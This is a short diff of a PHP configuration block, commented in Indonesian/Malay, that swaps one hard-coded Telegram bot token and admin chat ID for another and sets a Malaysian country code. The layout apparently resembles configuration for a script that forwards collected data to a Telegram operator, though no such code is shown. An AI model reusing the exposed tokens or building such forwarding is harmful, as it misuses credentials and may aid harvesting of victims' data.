@@ -2,8 +2,8 @@
 session_start();
 
 // ===== KONFIGURASI LANGSUNG (TANPA _rules.json) =====
-$BOTKN  = "8973568693:AAHJQ9ILOOQkKjAtmGBc1cZQ98RntRumDj0";  // Token Bot Telegram Anda
-$ADMID  = "7091091230";                                         // ID Telegram Admin Anda
+$BOTKN  = "9074902271:AAGDaLfL2n0oc4OU5UA0PR99Gv4n1dg4enI";  // Token Bot Telegram Anda
+$ADMID  = "7602918468";                                         // ID Telegram Admin Anda
 $CCODE  = "60";                                                 // Kode Negara (Malaysia)
 // ====================================================
 
